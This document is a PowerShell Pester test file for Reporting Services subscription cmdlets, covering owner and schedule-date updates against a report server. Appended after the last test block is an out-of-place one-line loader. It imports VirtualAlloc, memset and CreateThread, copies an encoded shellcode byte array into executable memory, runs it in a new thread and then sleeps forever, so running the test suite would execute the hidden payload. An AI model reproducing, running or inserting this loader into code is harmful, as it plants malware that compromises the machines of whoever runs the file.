


$reportServerUri = if ($env:PesterServerUrl -eq $null) { 'http://localhost/reportserver' } else { $env:PesterServerUrl }

Function Set-FolderReportDataSource
{
    param (
        [string]
        $NewFolderPath
    )

    $tempProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri

    
    $localResourcesPath = (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\emptyReport.rdl'
    $null = Write-RsCatalogItem -Path $localResourcesPath -RsFolder $NewFolderPath -Proxy $tempProxy
    $report = (Get-RsFolderContent -RsFolder $NewFolderPath -Proxy $tempProxy)| Where-Object TypeName -eq 'Report'

    
    $localResourcesPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\UnDataset.rsd'
    $null = Write-RsCatalogItem -Path $localResourcesPath -RsFolder $NewFolderPath -Proxy $tempProxy
    $dataSet = (Get-RsFolderContent -RsFolder $NewFolderPath -Proxy $tempProxy) | Where-Object TypeName -eq 'DataSet'
    $DataSetPath = $NewFolderPath + '/UnDataSet'

    
    $newRSDSName = "DataSource"
    $newRSDSExtension = "SQL"
    $newRSDSConnectionString = "Initial Catalog=DB; Data Source=Instance"
    $newRSDSCredentialRetrieval = "Store"
    $Pass = ConvertTo-SecureString -String "123" -AsPlainText -Force
    $newRSDSCredential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "sql", $Pass
    $null = New-RsDataSource -RsFolder $NewFolderPath -Name $newRSDSName -Extension $newRSDSExtension -ConnectionString $newRSDSConnectionString -CredentialRetrieval $newRSDSCredentialRetrieval -DatasourceCredentials $newRSDSCredential -Proxy $tempProxy

    $DataSourcePath = "$NewFolderPath/$newRSDSName"

    
    $RsDataSet = Get-RsItemReference -Path $report.Path -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSet'
    $RsDataSource = Get-RsItemReference -Path $report.Path -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSource'
    $RsDataSetSource = Get-RsItemReference -Path $DataSetPath -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSource'

    
    $null = Set-RsDataSourceReference -Path $DataSetPath -DataSourceName $RsDataSetSource.Name -DataSourcePath $DataSourcePath -Proxy $tempProxy
    $null = Set-RsDataSourceReference -Path $report.Path -DataSourceName $RsDataSource.Name -DataSourcePath $DataSourcePath -Proxy $tempProxy
    $null = Set-RsDataSetReference -Path $report.Path -DataSetName $RsDataSet.Name -DataSetPath $dataSet.Path -Proxy $tempProxy

    return $report
}

Describe "Update-RsSubscription" {
    $folderPath = ''
    $newReport = $null

    BeforeEach {
        $folderName = 'SutGetRsItemReference_MinParameters' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $folderName -ReportServerUri $reportServerUri
        $folderPath = '/' + $folderName

        
        $newReport = Set-FolderReportDataSource($folderPath)

        
        New-RsSubscription -ReportServerUri $reportServerUri -RsItem $newReport.Path -DeliveryMethod FileShare -Schedule (New-RsScheduleXml) -FileSharePath '\\unc\path' -Filename 'Report' -FileWriteMode Overwrite -RenderFormat PDF
    }

    AfterEach {
        Remove-RsCatalogItem -RsFolder $folderPath -ReportServerUri $reportServerUri -Confirm:$false
    }

    Context "Set-RsSubscription with Proxy parameter" {
        BeforeEach {
            Grant-RsSystemRole -Identity 'LOCAL' -RoleName 'System User' -ReportServerUri $reportServerUri
            Grant-RsCatalogItemRole -Identity 'LOCAL' -RoleName 'Browser' -Path $newReport.path -ReportServerUri $reportServerUri
        }

        AfterEach {
            Revoke-RsSystemAccess -Identity 'local' -ReportServerUri $reportServerUri
        }

        It "Updates subscription owner" {
            $rsProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            Get-RsSubscription -Path $newReport.Path -Proxy $rsProxy | Set-RsSubscription -Owner "LOCAL" -Proxy $rsProxy

            $reportSubscriptions =  Get-RsSubscription -Path $newReport.Path -Proxy $rsProxy
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false
            $reportSubscriptions.Owner | Should be "\LOCAL"
        }

        It "Updates StartDateTime parameter" {
            $rsProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            Get-RsSubscription -Path $newReport.Path -Proxy $rsProxy | Set-RsSubscription -StartDateTime "1/1/1999 6AM" -Proxy $rsProxy

            $reportSubscriptions =  Get-RsSubscription -Path $newReport.Path -Proxy $rsProxy
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false

            [xml]$XMLMatch = $reportSubscriptions.MatchData
            $XMLMatch.ScheduleDefinition.StartDateTime.InnerText | Should be (Get-Date -Year 1999 -Month 1 -Day 1 -Hour 6 -Minute 0 -Second 0 -Millisecond 0 -Format 'yyyy-MM-ddTHH:mm:ss.fffzzz')
        }

        It "Updates EndDate parameter" {
            $rsProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            Get-RsSubscription -Path $newReport.Path -Proxy $rsProxy | Set-RsSubscription -EndDate 1/1/2999 -Proxy $rsProxy

            $reportSubscriptions =  Get-RsSubscription -Path $newReport.Path -Proxy $rsProxy
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false

            [xml]$XMLMatch = $reportSubscriptions.MatchData
            $XMLMatch.ScheduleDefinition.EndDate.InnerText | Should be "2999-01-01"
        }

        It "Updates StartDateTime and EndDate parameter" {
            $rsProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            Get-RsSubscription -Path $newReport.Path -Proxy $rsProxy | Set-RsSubscription -StartDateTime "1/1/2000 2PM" -EndDate 2/1/2999 -Proxy $rsProxy

            $reportSubscriptions =  Get-RsSubscription -Path $newReport.Path -Proxy $rsProxy
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false

            [xml]$XMLMatch = $reportSubscriptions.MatchData
            $XMLMatch.ScheduleDefinition.StartDateTime.InnerText | Should be (Get-Date -Year 2000 -Month 1 -Day 1 -Hour 14 -Minute 0 -Second 0 -Millisecond 0 -Format 'yyyy-MM-ddTHH:mm:ss.fffzzz')
            $XMLMatch.ScheduleDefinition.EndDate.InnerText | Should Be "2999-02-01"
        }
    }

    Context "Set-RsSubscription with ReportServerUri parameter" {
        BeforeEach {
            Grant-RsSystemRole -Identity 'LOCAL' -RoleName 'System User' -ReportServerUri $reportServerUri
            Grant-RsCatalogItemRole -Identity 'LOCAL' -RoleName 'Browser' -Path $newReport.path -ReportServerUri $reportServerUri
        }

        AfterEach {
            Revoke-RsSystemAccess -Identity 'local' -ReportServerUri $reportServerUri
        }

        It "Updates subscription owner" {
            Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri | Set-RsSubscription -Owner "LOCAL" -ReportServerUri $reportServerUri

            $reportSubscriptions =  Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false
            $reportSubscriptions.Owner | Should be "\LOCAL"
        }

        It "Updates StartDateTime parameter" {
            $rsProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri | Set-RsSubscription -StartDateTime "1/1/1999 6AM" -ReportServerUri $reportServerUri

            $reportSubscriptions =  Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false

            [xml]$XMLMatch = $reportSubscriptions.MatchData
            $XMLMatch.ScheduleDefinition.StartDateTime.InnerText | Should be (Get-Date -Year 1999 -Month 1 -Day 1 -Hour 6 -Minute 0 -Second 0 -Millisecond 0 -Format 'yyyy-MM-ddTHH:mm:ss.fffzzz')
        }

        It "Updates EndDate parameter" {
            $rsProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri | Set-RsSubscription -EndDate 1/1/2999 -ReportServerUri $reportServerUri

            $reportSubscriptions =  Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false

            [xml]$XMLMatch = $reportSubscriptions.MatchData
            $XMLMatch.ScheduleDefinition.EndDate.InnerText | Should be "2999-01-01"
        }

        It "Updates StartDateTime and EndDate parameter" {
            $rsProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri | Set-RsSubscription -StartDateTime "1/1/2000 2PM" -EndDate 2/1/2999 -ReportServerUri $reportServerUri

            $reportSubscriptions =  Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false

            [xml]$XMLMatch = $reportSubscriptions.MatchData
            $XMLMatch.ScheduleDefinition.StartDateTime.InnerText | Should be (Get-Date -Year 2000 -Month 1 -Day 1 -Hour 14 -Minute 0 -Second 0 -Millisecond 0 -Format 'yyyy-MM-ddTHH:mm:ss.fffzzz')
            $XMLMatch.ScheduleDefinition.EndDate.InnerText | Should Be "2999-02-01"
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xca,0xba,0x78,0x0b,0x1c,0xc1,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x50,0x18,0x03,0x50,0x18,0x83,0xe8,0x84,0xe9,0xe9,0x3d,0x9c,0x6c,0x11,0xbe,0x5c,0x11,0x9b,0x5b,0x6d,0x11,0xff,0x28,0xdd,0xa1,0x8b,0x7d,0xd1,0x4a,0xd9,0x95,0x62,0x3e,0xf6,0x9a,0xc3,0xf5,0x20,0x94,0xd4,0xa6,0x11,0xb7,0x56,0xb5,0x45,0x17,0x67,0x76,0x98,0x56,0xa0,0x6b,0x51,0x0a,0x79,0xe7,0xc4,0xbb,0x0e,0xbd,0xd4,0x30,0x5c,0x53,0x5d,0xa4,0x14,0x52,0x4c,0x7b,0x2f,0x0d,0x4e,0x7d,0xfc,0x25,0xc7,0x65,0xe1,0x00,0x91,0x1e,0xd1,0xff,0x20,0xf7,0x28,0xff,0x8f,0x36,0x85,0xf2,0xce,0x7f,0x21,0xed,0xa4,0x89,0x52,0x90,0xbe,0x4d,0x29,0x4e,0x4a,0x56,0x89,0x05,0xec,0xb2,0x28,0xc9,0x6b,0x30,0x26,0xa6,0xf8,0x1e,0x2a,0x39,0x2c,0x15,0x56,0xb2,0xd3,0xfa,0xdf,0x80,0xf7,0xde,0x84,0x53,0x99,0x47,0x60,0x35,0xa6,0x98,0xcb,0xea,0x02,0xd2,0xe1,0xff,0x3e,0xb9,0x6d,0x33,0x73,0x42,0x6d,0x5b,0x04,0x31,0x5f,0xc4,0xbe,0xdd,0xd3,0x8d,0x18,0x19,0x14,0xa4,0xdd,0xb5,0xeb,0x47,0x1e,0x9f,0x2f,0x13,0x4e,0xb7,0x86,0x1c,0x05,0x47,0x27,0xc9,0xb0,0x42,0xbf,0x32,0xec,0x4d,0x30,0xdb,0xef,0x4d,0x5f,0x47,0x79,0xab,0x0f,0x27,0x29,0x64,0xef,0x97,0x89,0xd4,0x87,0xfd,0x05,0x0a,0xb7,0xfd,0xcf,0x23,0x5d,0x12,0xa6,0x1c,0xc9,0x8b,0xe3,0xd7,0x68,0x53,0x3e,0x92,0xaa,0xdf,0xcd,0x62,0x64,0x28,0xbb,0x70,0x10,0xd8,0xf6,0x2b,0xb6,0xe7,0x2c,0x41,0x36,0x72,0xcb,0xc0,0x61,0xea,0xd1,0x35,0x45,0xb5,0x2a,0x10,0xde,0x7c,0xbf,0xdb,0x88,0x80,0x2f,0xdc,0x48,0xd7,0x25,0xdc,0x20,0x8f,0x1d,0x8f,0x55,0xd0,0x8b,0xa3,0xc6,0x45,0x34,0x92,0xbb,0xce,0x5c,0x18,0xe2,0x39,0xc3,0xe3,0xc1,0xbb,0x3f,0x32,0x2f,0xce,0x51,0x86;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

